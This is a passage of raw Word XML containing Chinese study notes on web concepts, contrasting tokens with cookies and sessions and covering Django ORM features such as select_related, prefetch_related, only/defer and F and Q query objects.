      <w:r w:rsidRPr="008A1DE1">
        <w:rPr>
          <w:b/>
          <w:bCs/>
          <w:color w:val="008080"/>
        </w:rPr>
        <w:t>token与cookie</w:t>
      </w:r>
      <w:r w:rsidRPr="008A1DE1">
        <w:rPr>
          <w:rFonts w:hint="eastAsia"/>
          <w:b/>
          <w:bCs/>
          <w:color w:val="008080"/>
        </w:rPr>
        <w:t>：</w:t>
      </w:r>
      <w:r w:rsidRPr="008A1DE1">
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
        <w:t>Cookie是不允许垮域访问的，但是token是支持的， 前提是传输的用户认证信息通过HTTP头传输； token就是令牌，比如你授权（登录）一个程序时，他就是个依据，判断你是否已经授权该软件；cookie就是写在客户端的一个txt文件，里面包括你登录信息之类的，这样你</w:t>
      </w:r>
      <w:r w:rsidRPr="008A1DE1">
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
        <w:lastRenderedPageBreak/>
        <w:t>下次在登录某个网站，就会自动调用cookie自动登录用户名；session和cookie差不多，只是session是写在服务器端的文件，也需要在客户端写入cookie文件，但是文件里是你的浏览器编号.Session的状态是存储在服务器端，客户端只有session id；而Token的状态是存储在客户端。</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="2AB7DDF3" w14:textId="77777777" w:rsidR="00E912B5" w:rsidRPr="00E912B5" w:rsidRDefault="00E912B5" w:rsidP="0049386C">
      <w:pPr>
        <w:pStyle w:val="a8"/>
        <w:widowControl/>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="27"/>
        </w:numPr>
        <w:pBdr>
          <w:bottom w:val="single" w:sz="6" w:space="4" w:color="EEEEEE"/>
        </w:pBdr>
        <w:spacing w:before="100" w:beforeAutospacing="1" w:after="100" w:afterAutospacing="1" w:line="600" w:lineRule="exact"/>
        <w:ind w:firstLineChars="0"/>
        <w:contextualSpacing/>
        <w:jc w:val="center"/>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网络编程</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="6ACA81F3" w14:textId="77777777" w:rsidR="00E912B5" w:rsidRPr="00E912B5" w:rsidRDefault="00E912B5" w:rsidP="0049386C">
      <w:pPr>
        <w:pStyle w:val="a8"/>
        <w:widowControl/>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="27"/>
        </w:numPr>
        <w:pBdr>
          <w:bottom w:val="single" w:sz="6" w:space="4" w:color="EEEEEE"/>
        </w:pBdr>
        <w:spacing w:line="400" w:lineRule="exact"/>
        <w:ind w:firstLineChars="0"/>
        <w:contextualSpacing/>
        <w:jc w:val="center"/>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django</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="75E83CD6" w14:textId="77777777" w:rsidR="00E912B5" w:rsidRPr="00E912B5" w:rsidRDefault="00E912B5" w:rsidP="008A1DE1">
      <w:pPr>
        <w:pStyle w:val="a8"/>
        <w:widowControl/>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="27"/>
        </w:numPr>
        <w:spacing w:line="400" w:lineRule="exact"/>
        <w:ind w:left="714" w:firstLineChars="0" w:hanging="357"/>
        <w:contextualSpacing/>
        <w:jc w:val="left"/>
        <w:outlineLvl w:val="2"/>
        <w:rPr>
          <w:rFonts w:ascii="Helvetica" w:eastAsia="宋体" w:hAnsi="Helvetica" w:cs="Helvetica"/>
          <w:b/>
          <w:bCs/>
          <w:color w:val="333333"/>
          <w:kern w:val="0"/>
          <w:sz w:val="36"/>
          <w:szCs w:val="36"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00E912B5">
        <w:rPr>
          <w:rFonts w:ascii="Helvetica" w:eastAsia="宋体" w:hAnsi="Helvetica" w:cs="Helvetica"/>
          <w:b/>
          <w:bCs/>
          <w:color w:val="333333"/>
          <w:kern w:val="0"/>
          <w:sz w:val="36"/>
          <w:szCs w:val="36"/>
        </w:rPr>
        <w:t>1. Django ORM</w:t>
      </w:r>
      <w:r w:rsidRPr="00E912B5">
        <w:rPr>
          <w:rFonts w:ascii="Helvetica" w:eastAsia="宋体" w:hAnsi="Helvetica" w:cs="Helvetica"/>
          <w:b/>
          <w:bCs/>
          <w:color w:val="333333"/>
          <w:kern w:val="0"/>
          <w:sz w:val="36"/>
          <w:szCs w:val="36"/>
        </w:rPr>
        <w:t>查询中</w:t>
      </w:r>
      <w:r w:rsidRPr="00E912B5">
        <w:rPr>
          <w:rFonts w:ascii="Helvetica" w:eastAsia="宋体" w:hAnsi="Helvetica" w:cs="Helvetica"/>
          <w:b/>
          <w:bCs/>
          <w:color w:val="333333"/>
          <w:kern w:val="0"/>
          <w:sz w:val="36"/>
          <w:szCs w:val="36"/>
        </w:rPr>
        <w:t>select_related</w:t>
      </w:r>
      <w:r w:rsidRPr="00E912B5">
        <w:rPr>
          <w:rFonts w:ascii="Helvetica" w:eastAsia="宋体" w:hAnsi="Helvetica" w:cs="Helvetica"/>
          <w:b/>
          <w:bCs/>
          <w:color w:val="333333"/>
          <w:kern w:val="0"/>
          <w:sz w:val="36"/>
          <w:szCs w:val="36"/>
        </w:rPr>
        <w:t>和</w:t>
      </w:r>
      <w:r w:rsidRPr="00E912B5">
        <w:rPr>
          <w:rFonts w:ascii="Helvetica" w:eastAsia="宋体" w:hAnsi="Helvetica" w:cs="Helvetica"/>
          <w:b/>
          <w:bCs/>
          <w:color w:val="333333"/>
          <w:kern w:val="0"/>
          <w:sz w:val="36"/>
          <w:szCs w:val="36"/>
        </w:rPr>
        <w:t>prefetch_related</w:t>
      </w:r>
      <w:r w:rsidRPr="00E912B5">
        <w:rPr>
          <w:rFonts w:ascii="Helvetica" w:eastAsia="宋体" w:hAnsi="Helvetica" w:cs="Helvetica"/>
          <w:b/>
          <w:bCs/>
          <w:color w:val="333333"/>
          <w:kern w:val="0"/>
          <w:sz w:val="36"/>
          <w:szCs w:val="36"/>
        </w:rPr>
        <w:t>的区别？？</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="6972DDCB" w14:textId="77777777" w:rsidR="00E912B5" w:rsidRPr="008A1DE1" w:rsidRDefault="00E912B5" w:rsidP="008A1DE1">
      <w:pPr>
        <w:pStyle w:val="HTML"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F5F5F5"/>
        <w:wordWrap w:val="0"/>
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="008A1DE1">
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
        <w:t>def select_related(self, *fields)</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="76B39EEB" w14:textId="77777777" w:rsidR="00E912B5" w:rsidRPr="008A1DE1" w:rsidRDefault="00E912B5" w:rsidP="008A1DE1">
      <w:pPr>
        <w:pStyle w:val="HTML"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F5F5F5"/>
        <w:wordWrap w:val="0"/>
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="008A1DE1">
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
        <w:t xml:space="preserve">    性能相关：表之间进行join连表操作，一次性获取关联的数据。</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="63E485F8" w14:textId="77777777" w:rsidR="00E912B5" w:rsidRPr="008A1DE1" w:rsidRDefault="00E912B5" w:rsidP="008A1DE1">
      <w:pPr>
        <w:pStyle w:val="HTML"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F5F5F5"/>
        <w:wordWrap w:val="0"/>
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="008A1DE1">
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
        <w:t xml:space="preserve">    总结：</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="50F46AD0" w14:textId="77777777" w:rsidR="00E912B5" w:rsidRPr="008A1DE1" w:rsidRDefault="00E912B5" w:rsidP="008A1DE1">
      <w:pPr>
        <w:pStyle w:val="HTML"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F5F5F5"/>
        <w:wordWrap w:val="0"/>
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="008A1DE1">
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
        <w:t xml:space="preserve">    1. select_related主要针一对一和多对一关系进行优化。</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="4BB280BC" w14:textId="77777777" w:rsidR="00E912B5" w:rsidRPr="008A1DE1" w:rsidRDefault="00E912B5" w:rsidP="008A1DE1">
      <w:pPr>
        <w:pStyle w:val="HTML"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F5F5F5"/>
        <w:wordWrap w:val="0"/>
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="008A1DE1">
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
        <w:t xml:space="preserve">    2. select_related使用SQL的JOIN语句进行优化，通过减少SQL查询的次数来进行优化、提高性能。</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="1A01779A" w14:textId="77777777" w:rsidR="00E912B5" w:rsidRPr="008A1DE1" w:rsidRDefault="00E912B5" w:rsidP="008A1DE1">
      <w:pPr>
        <w:pStyle w:val="HTML"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F5F5F5"/>
        <w:wordWrap w:val="0"/>
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="008A1DE1">
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
        <w:t>def prefetch_related(self, *lookups)</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="4556177A" w14:textId="77777777" w:rsidR="00E912B5" w:rsidRPr="008A1DE1" w:rsidRDefault="00E912B5" w:rsidP="008A1DE1">
      <w:pPr>
        <w:pStyle w:val="HTML"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F5F5F5"/>
        <w:wordWrap w:val="0"/>
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="008A1DE1">
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
        <w:t xml:space="preserve">    性能相关：多表连表操作时速度会慢，使用其执行多次SQL查询在Python代码中实现连表操作。</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="12CF7692" w14:textId="77777777" w:rsidR="00E912B5" w:rsidRPr="008A1DE1" w:rsidRDefault="00E912B5" w:rsidP="008A1DE1">
      <w:pPr>
        <w:pStyle w:val="HTML"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F5F5F5"/>
        <w:wordWrap w:val="0"/>
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="008A1DE1">
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
        <w:t xml:space="preserve">    总结：</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="3C046AF3" w14:textId="77777777" w:rsidR="00E912B5" w:rsidRPr="008A1DE1" w:rsidRDefault="00E912B5" w:rsidP="008A1DE1">
      <w:pPr>
        <w:pStyle w:val="HTML"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F5F5F5"/>
        <w:wordWrap w:val="0"/>
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="008A1DE1">
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
        <w:t xml:space="preserve">    1. 对于多对多字段（ManyToManyField）和一对多字段，可以使用prefetch_related()来进行优化。</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="1087B0B1" w14:textId="77777777" w:rsidR="00E912B5" w:rsidRPr="008A1DE1" w:rsidRDefault="00E912B5" w:rsidP="008A1DE1">
      <w:pPr>
        <w:pStyle w:val="HTML"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F5F5F5"/>
        <w:wordWrap w:val="0"/>
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="008A1DE1">
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
        <w:t xml:space="preserve">    2. prefetch_related()的优化方式是分别查询每个表，然后用Python处理他们之间的关系。</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="4092238F" w14:textId="77777777" w:rsidR="00E912B5" w:rsidRPr="00E912B5" w:rsidRDefault="00E912B5" w:rsidP="00173FC9">
      <w:pPr>
        <w:pStyle w:val="a8"/>
        <w:widowControl/>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="27"/>
        </w:numPr>
        <w:spacing w:line="400" w:lineRule="exact"/>
        <w:ind w:left="714" w:firstLineChars="0" w:hanging="357"/>
        <w:contextualSpacing/>
        <w:jc w:val="left"/>
        <w:outlineLvl w:val="2"/>
        <w:rPr>
          <w:rFonts w:ascii="Helvetica" w:eastAsia="宋体" w:hAnsi="Helvetica" w:cs="Helvetica"/>
          <w:b/>
          <w:bCs/>
          <w:color w:val="333333"/>
          <w:kern w:val="0"/>
          <w:sz w:val="36"/>
          <w:szCs w:val="36"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00E912B5">
        <w:rPr>
          <w:rFonts w:ascii="Helvetica" w:eastAsia="宋体" w:hAnsi="Helvetica" w:cs="Helvetica"/>
          <w:b/>
          <w:bCs/>
          <w:color w:val="333333"/>
          <w:kern w:val="0"/>
          <w:sz w:val="36"/>
          <w:szCs w:val="36"/>
        </w:rPr>
        <w:t xml:space="preserve">only </w:t>
      </w:r>
      <w:r w:rsidRPr="00E912B5">
        <w:rPr>
          <w:rFonts w:ascii="Helvetica" w:eastAsia="宋体" w:hAnsi="Helvetica" w:cs="Helvetica"/>
          <w:b/>
          <w:bCs/>
          <w:color w:val="333333"/>
          <w:kern w:val="0"/>
          <w:sz w:val="36"/>
          <w:szCs w:val="36"/>
        </w:rPr>
        <w:t>和</w:t>
      </w:r>
      <w:r w:rsidRPr="00E912B5">
        <w:rPr>
          <w:rFonts w:ascii="Helvetica" w:eastAsia="宋体" w:hAnsi="Helvetica" w:cs="Helvetica"/>
          <w:b/>
          <w:bCs/>
          <w:color w:val="333333"/>
          <w:kern w:val="0"/>
          <w:sz w:val="36"/>
          <w:szCs w:val="36"/>
        </w:rPr>
        <w:t xml:space="preserve"> defer </w:t>
      </w:r>
      <w:r w:rsidRPr="00E912B5">
        <w:rPr>
          <w:rFonts w:ascii="Helvetica" w:eastAsia="宋体" w:hAnsi="Helvetica" w:cs="Helvetica"/>
          <w:b/>
          <w:bCs/>
          <w:color w:val="333333"/>
          <w:kern w:val="0"/>
          <w:sz w:val="36"/>
          <w:szCs w:val="36"/>
        </w:rPr>
        <w:t>的区别</w:t>
      </w:r>
      <w:r w:rsidRPr="00E912B5">
        <w:rPr>
          <w:rFonts w:ascii="Helvetica" w:eastAsia="宋体" w:hAnsi="Helvetica" w:cs="Helvetica"/>
          <w:b/>
          <w:bCs/>
          <w:color w:val="333333"/>
          <w:kern w:val="0"/>
          <w:sz w:val="36"/>
          <w:szCs w:val="36"/>
        </w:rPr>
        <w:t>?</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="416AF3B3" w14:textId="77777777" w:rsidR="00E912B5" w:rsidRPr="008A1DE1" w:rsidRDefault="00E912B5" w:rsidP="008A1DE1">
      <w:pPr>
        <w:pStyle w:val="HTML"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F5F5F5"/>
        <w:wordWrap w:val="0"/>
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="008A1DE1">
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
        <w:t>only('id','name'):取的对象，只有id和name</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="3F13F032" w14:textId="77777777" w:rsidR="00E912B5" w:rsidRPr="008A1DE1" w:rsidRDefault="00E912B5" w:rsidP="008A1DE1">
      <w:pPr>
        <w:pStyle w:val="HTML"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F5F5F5"/>
        <w:wordWrap w:val="0"/>
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="008A1DE1">
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
        <w:t>defer('id','name'):取出对象，字段除了id和name都有</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="7AF283A7" w14:textId="77777777" w:rsidR="00E912B5" w:rsidRPr="00E912B5" w:rsidRDefault="00E912B5" w:rsidP="00173FC9">
      <w:pPr>
        <w:pStyle w:val="a8"/>
        <w:widowControl/>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="27"/>
        </w:numPr>
        <w:spacing w:line="400" w:lineRule="exact"/>
        <w:ind w:left="714" w:firstLineChars="0" w:hanging="357"/>
        <w:contextualSpacing/>
        <w:jc w:val="left"/>
        <w:outlineLvl w:val="2"/>
        <w:rPr>
          <w:rFonts w:ascii="Helvetica" w:eastAsia="宋体" w:hAnsi="Helvetica" w:cs="Helvetica"/>
          <w:b/>
          <w:bCs/>
          <w:color w:val="333333"/>
          <w:kern w:val="0"/>
          <w:sz w:val="36"/>
          <w:szCs w:val="36"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00E912B5">
        <w:rPr>
          <w:rFonts w:ascii="Helvetica" w:eastAsia="宋体" w:hAnsi="Helvetica" w:cs="Helvetica"/>
          <w:b/>
          <w:bCs/>
          <w:color w:val="333333"/>
          <w:kern w:val="0"/>
          <w:sz w:val="36"/>
          <w:szCs w:val="36"/>
        </w:rPr>
        <w:t>2. Django ORM</w:t>
      </w:r>
      <w:r w:rsidRPr="00E912B5">
        <w:rPr>
          <w:rFonts w:ascii="Helvetica" w:eastAsia="宋体" w:hAnsi="Helvetica" w:cs="Helvetica"/>
          <w:b/>
          <w:bCs/>
          <w:color w:val="333333"/>
          <w:kern w:val="0"/>
          <w:sz w:val="36"/>
          <w:szCs w:val="36"/>
        </w:rPr>
        <w:t>是什么？</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="44B1A789" w14:textId="77777777" w:rsidR="00E912B5" w:rsidRPr="008A1DE1" w:rsidRDefault="00E912B5" w:rsidP="008A1DE1">
      <w:pPr>
        <w:pStyle w:val="HTML"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F5F5F5"/>
        <w:wordWrap w:val="0"/>
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="008A1DE1">
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
        <w:t>对象关系映射，通过models中的类来对应数据库中的一个表，一个对象对应一个数据行，一个属性对应数据库中的一个字段</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="6E7514FF" w14:textId="77777777" w:rsidR="00E912B5" w:rsidRPr="00E912B5" w:rsidRDefault="00E912B5" w:rsidP="0049386C">
      <w:pPr>
        <w:pStyle w:val="a8"/>
        <w:widowControl/>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="27"/>
        </w:numPr>
        <w:spacing w:line="34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 xml:space="preserve">F </w:t>
      </w:r>
      <w:r w:rsidRPr="00E912B5">
        <w:rPr>
          <w:rFonts w:ascii="Helvetica" w:eastAsia="宋体" w:hAnsi="Helvetica" w:cs="Helvetica"/>
          <w:b/>
          <w:bCs/>
          <w:color w:val="333333"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t>对象</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作用：用于类属性之间的比较条件。</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="1CB37FDD" w14:textId="77777777" w:rsidR="00E912B5" w:rsidRPr="00173FC9" w:rsidRDefault="00E912B5" w:rsidP="00173FC9">
      <w:pPr>
        <w:pStyle w:val="HTML"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F5F5F5"/>
        <w:wordWrap w:val="0"/>
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00173FC9">
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
        <w:t xml:space="preserve">1. from django.db.models import F </w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="2D3CF344" w14:textId="77777777" w:rsidR="00E912B5" w:rsidRPr="00173FC9" w:rsidRDefault="00E912B5" w:rsidP="00173FC9">
      <w:pPr>
        <w:pStyle w:val="HTML"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F5F5F5"/>
        <w:wordWrap w:val="0"/>
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00173FC9">
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
        <w:t xml:space="preserve">2. 例：where bread &gt; bcomment BookInfo.objects.filter(bread__gt =F(‘bcomment’)) </w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="164D311A" w14:textId="77777777" w:rsidR="00E912B5" w:rsidRPr="00173FC9" w:rsidRDefault="00E912B5" w:rsidP="00173FC9">
      <w:pPr>
        <w:pStyle w:val="HTML"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F5F5F5"/>
        <w:wordWrap w:val="0"/>
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00173FC9">
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
        <w:t xml:space="preserve">3. 例：BookInfo.objects.filter(bread__gt=F(‘bcomment’)*2) </w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="2A616B2B" w14:textId="77777777" w:rsidR="00E912B5" w:rsidRPr="00E912B5" w:rsidRDefault="00E912B5" w:rsidP="0049386C">
      <w:pPr>
        <w:pStyle w:val="a8"/>
        <w:widowControl/>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="27"/>
        </w:numPr>
        <w:spacing w:line="34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 xml:space="preserve">Q </w:t>
      </w:r>
      <w:r w:rsidRPr="00E912B5">
        <w:rPr>
          <w:rFonts w:ascii="Helvetica" w:eastAsia="宋体" w:hAnsi="Helvetica" w:cs="Helvetica"/>
          <w:b/>
          <w:bCs/>
          <w:color w:val="333333"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t>对象</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作用：用于查询时的逻辑条件。可以对</w:t>
      </w:r>
      <w:r w:rsidRPr="00E912B5">
        <w:rPr>
          <w:rFonts w:ascii="Helvetica" w:eastAsia="宋体" w:hAnsi="Helvetica" w:cs="Helvetica"/>
          <w:color w:val="333333"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t xml:space="preserve"> Q </w:t>
      </w:r>
      <w:r w:rsidRPr="00E912B5">
        <w:rPr>
          <w:rFonts w:ascii="Helvetica" w:eastAsia="宋体" w:hAnsi="Helvetica" w:cs="Helvetica"/>
          <w:color w:val="333333"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t>对象进行</w:t>
      </w:r>
      <w:r w:rsidRPr="00E912B5">
        <w:rPr>
          <w:rFonts w:ascii="Helvetica" w:eastAsia="宋体" w:hAnsi="Helvetica" w:cs="Helvetica"/>
          <w:color w:val="333333"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t>&amp;|~</w:t>
      </w:r>
      <w:r w:rsidRPr="00E912B5">
        <w:rPr>
          <w:rFonts w:ascii="Helvetica" w:eastAsia="宋体" w:hAnsi="Helvetica" w:cs="Helvetica"/>
          <w:color w:val="333333"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t>操作。</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="7659175A" w14:textId="77777777" w:rsidR="00E912B5" w:rsidRPr="00173FC9" w:rsidRDefault="00E912B5" w:rsidP="00173FC9">
      <w:pPr>
        <w:pStyle w:val="HTML"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F5F5F5"/>
        <w:wordWrap w:val="0"/>
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00173FC9">
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
        <w:t xml:space="preserve">1. from django.db.models import Q  </w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="52E1C384" w14:textId="77777777" w:rsidR="00E912B5" w:rsidRPr="00173FC9" w:rsidRDefault="00E912B5" w:rsidP="00173FC9">
      <w:pPr>
        <w:pStyle w:val="HTML"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F5F5F5"/>
        <w:wordWrap w:val="0"/>
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00173FC9">
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
        <w:t xml:space="preserve">2. BookInfo.objects.filter(id__gt=3， bread__gt=30) </w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="3A16877B" w14:textId="77777777" w:rsidR="00E912B5" w:rsidRPr="00173FC9" w:rsidRDefault="00E912B5" w:rsidP="00173FC9">
      <w:pPr>
        <w:pStyle w:val="HTML"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F5F5F5"/>
        <w:wordWrap w:val="0"/>
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00173FC9">
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
        <w:t xml:space="preserve">3. BooInfo.objects.filter(Q(id__gt=3) &amp; Q(bread__gt=3)) </w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="0D583C13" w14:textId="77777777" w:rsidR="00E912B5" w:rsidRPr="00173FC9" w:rsidRDefault="00E912B5" w:rsidP="00173FC9">
      <w:pPr>
        <w:pStyle w:val="HTML"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F5F5F5"/>
        <w:wordWrap w:val="0"/>
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00173FC9">
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
        <w:t xml:space="preserve">4. 例：BookInfo.objects.filter(Q(id__gt=3) | Q(bread__gt=30)) </w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="0D0555D5" w14:textId="77777777" w:rsidR="00E912B5" w:rsidRPr="00173FC9" w:rsidRDefault="00E912B5" w:rsidP="00173FC9">
      <w:pPr>
        <w:pStyle w:val="HTML"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F5F5F5"/>
        <w:wordWrap w:val="0"/>
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00173FC9">
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
        <w:t xml:space="preserve">5. 例：BookInfo.objects.filter(~Q(id=3)) </w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="094D8308" w14:textId="77777777" w:rsidR="008B2E56" w:rsidRPr="007C2612" w:rsidRDefault="008B2E56" w:rsidP="008B2E56">
      <w:pPr>
        <w:widowControl/>
        <w:pBdr>
          <w:bottom w:val="single" w:sz="6" w:space="4" w:color="EEEEEE"/>
        </w:pBdr>
        <w:spacing w:before="100" w:beforeAutospacing="1" w:after="100" w:afterAutospacing="1" w:line="600" w:lineRule="exact"/>
        <w:contextualSpacing/>
        <w:jc w:val="center"/>
        <w:outlineLvl w:val="0"/>
        <w:rPr>
          <w:rFonts w:ascii="Helvetica" w:eastAsia="宋体" w:hAnsi="Helvetica" w:cs="Helvetica"/>
          <w:b/>
          <w:bCs/>
          <w:color w:val="333333"/>
          <w:kern w:val="36"/>
          <w:sz w:val="54"/>
          <w:szCs w:val="54"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="007C2612">
        <w:rPr>
          <w:rFonts w:ascii="Helvetica" w:eastAsia="宋体" w:hAnsi="Helvetica" w:cs="Helvetica"/>
          <w:b/>
          <w:bCs/>
          <w:color w:val="333333"/>
          <w:kern w:val="36"/>
          <w:sz w:val="54"/>
          <w:szCs w:val="54"/>
        </w:rPr>
        <w:lastRenderedPageBreak/>
        <w:t>Django</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="7DA8736A"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request</w:t>
      </w:r>
      <w:r w:rsidRPr="0022246E">
        <w:rPr>
          <w:rFonts w:ascii="Helvetica" w:eastAsia="宋体" w:hAnsi="Helvetica" w:cs="Helvetica"/>
          <w:b/>
          <w:bCs/>
          <w:color w:val="333333"/>
          <w:kern w:val="0"/>
          <w:sz w:val="36"/>
          <w:szCs w:val="36"/>
        </w:rPr>
        <w:t>生命周期</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="42609B79" w14:textId="77777777" w:rsidR="008B2E56"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E4B91">
        <w:rPr>
          <w:rFonts w:ascii="var(--monospace)" w:eastAsia="宋体" w:hAnsi="var(--monospace)" w:cs="宋体" w:hint="eastAsia"/>
          <w:color w:val="333333"/>
          <w:kern w:val="0"/>
          <w:sz w:val="22"/>
        </w:rPr>
        <w:t>而</w:t>
      </w:r>
      <w:r w:rsidRPr="007E4B91">
        <w:rPr>
          <w:rFonts w:ascii="var(--monospace)" w:eastAsia="宋体" w:hAnsi="var(--monospace)" w:cs="宋体"/>
          <w:color w:val="333333"/>
          <w:kern w:val="0"/>
